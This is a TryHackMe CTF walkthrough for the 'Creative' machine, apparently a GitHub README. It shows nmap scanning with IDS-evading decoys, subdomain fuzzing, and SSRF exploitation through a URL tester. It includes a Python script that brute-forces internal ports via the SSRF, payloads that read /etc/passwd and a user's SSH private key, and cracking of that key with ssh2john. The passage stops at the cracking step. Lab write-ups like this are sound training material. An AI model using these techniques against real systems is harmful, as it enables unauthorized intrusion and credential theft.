![intro](https://github.com/user-attachments/assets/8edd2168-b8ee-4480-a362-6e08069366d6)

# tryhackme-CTF-writeup-for-Creative

This is a walkthrough for the tryhackme CTF Creative. I will not provide any flags or passwords as this is intended to be used as a guide.

## Scanning/Reconnaissance

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -A -v $ip -D RND:10 -oN nmap.txt
```

Command break down:

-A: This flag enables aggressive scanning. It combines various scan types (like OS detection, version detection, script scanning, and traceroute) into a single scan.

-v: increases verbosity, providing more detailed output during the scan.

—$ip: provides the target IP we stored as the variable $ip.

-D RND:10 Nmap can send additional packets to confuse network intrusion detection systems (IDS) or hide the true source of the scan by randomly selecting up to 10 decoy IP addresses.

-oN nmap.txt: This option specifies normal output that should be saved to a file named “nmap.txt.

This scan reveals a two open ports:

![nmap](https://github.com/user-attachments/assets/cadfd25b-76ae-45df-8bb0-d3d8eff043d5)

Let's check out he webserver on port 80/tcp.

I was unable to connect the site so I added the site to the my /etc/hosts file. vim /etc/hosts. We can now explore the site.

I then ran gobuster and nikto scans on the target:

![nikto](https://github.com/user-attachments/assets/6c2ceba9-f5c4-43e8-b3d0-cfe569623681)

![gobuster](https://github.com/user-attachments/assets/54590aef-db43-44fa-a332-a6b0a69a1d41)

Let's check out /assets.

# Enumeration
It is forbidden. What I'm going to try next is wfuzz to see if there's any hidden subdomains.
```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --sc 200 -H "Host: FUZZ.creative.thm" -u http://creative.thm -t 100
```
Command breakdown:

-c: Enables colored output.

-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt: Specifies the wordlist to use for fuzzing.

--sc 200: Filters results to show only those with a status code of 200.

-H "Host: FUZZ.creative.thm": Sets the Host header, with FUZZ being the placeholder for the subdomains.

-u http://creative.thm: Specifies the target URL.

-t 100: Sets the number of concurrent threads to 100.

![wfuzz](https://github.com/user-attachments/assets/e93bef44-1ac1-4ee0-9633-a9439470c941)

We see a subdomain called beta. Let's add it to the /etc/hosts file and visit it.
Note: In order to sucessfully visit the subdomain it must be entered as http://beta.creative.thm.

![urltester](https://github.com/user-attachments/assets/4a45641d-00b3-46e2-a0e0-d9ea32fdec41)

If we put in http://localhost or http://127.0.0.1 (loop back address) we are taken to a frame work of the site.

![localhost_framework](https://github.com/user-attachments/assets/07d83fcc-f314-4aa4-9695-ff19b46181d0)

Let's create a test file to see if we can get it to display the contents:
```bash
echo "Attention" >> config.html
```
Then python server:
```bash
python3 -m http.server
```
Then in the url tester our IP and file:
```bash
http://<your IP>:8000/config.html
```
It it successfully printed "Attention". This demontrates that we have the ability to execute SSRF(Server Side Request Forgery), as we can get the server to hit anything we want by modifing the URL. This means that we will be able to execute an interal port scan. I will be using a python3 script portbrute.py:
```bash
import requests
from concurrent.futures import ThreadPoolExecutor

def send_post_request(url, payload, headers):
    try:
        response = requests.post(url, data=payload, headers=headers)
        content_length = response.headers.get('Content-Length')
        if content_length != '13':  # Check if content length isn't 13
            print(f"POST request to {url} with payload {payload} returned status code: {response.status_code}, content length: {content_length}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending POST request: {e}")

def main():
    base_url = "http://beta.creative.thm"
    headers = {
        "Host": "beta.creative.thm",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://beta.creative.thm",
        "Connection": "close",
        "Referer": "http://beta.creative.thm/",
        "Upgrade-Insecure-Requests": "1"
    }

    # Using ThreadPoolExecutor to run 20 threads concurrently
    with ThreadPoolExecutor(max_workers=20) as executor:
        for port_number in range(1, 65536):
            url = f"http://localhost:{port_number}"
            payload = f"url=http%3A%2F%2Flocalhost%3A{port_number}"
            executor.submit(send_post_request, base_url, payload, headers)

if __name__ == "__main__":
    main()
```
![portbrute_result](https://github.com/user-attachments/assets/0dc533b9-119d-4f40-ba3a-b4d0b78baecf)

And the results show port 80 and port 1337. I also ran an nmap scan of it:

![nmap1337](https://github.com/user-attachments/assets/263dda57-a8f9-4187-9ea2-b3040a743edc)

Now in the url tester, we'll input:
```bash
http://localhost:1337
```
This results in a listing of the target's file system, although clicking on the files results in "not found".
However:
```bash
http://localhost:1337/etc/passwd
```
Will display the file on the browser:

![passwd](https://github.com/user-attachments/assets/a6e7621e-d3f4-4d4d-9b68-c48fe0cdce3a)

So we'll save the /etc/passwd file and examine the users on the target.
Next I tried the directory /home/saad that is revealed in /etc/passwd:
```bash
http://localhost:1337/home/saad
```

![home_saad](https://github.com/user-attachments/assets/b7587daa-c8b5-4f59-9ab3-1b4df4230eff)

Next I ran user.txt from the user tester, and displayed the contents of user.txt.
```bash
http://localhost:1337/home/saad/user.txt
```
Next, I kept exploring the files in the fashion with .bashrc, and .ssh. .ssh takes us to an id_rsa file:

![id_rsa](https://github.com/user-attachments/assets/26c96ea0-9459-4309-b7d5-1f3b78cc74e9)

I used chatgpt as a way to make it neat. Then change the permissions:
```bash
chmod 600 id_rsa
```
I tried using id_rsa to ssh onto the target as saad:
```bash
ssh -i id_rsa saad@creative.thm
```
But it prompts for a password. 
So we have to use ssh2john:
```bash
ssh2john id_rsa >> hash
```

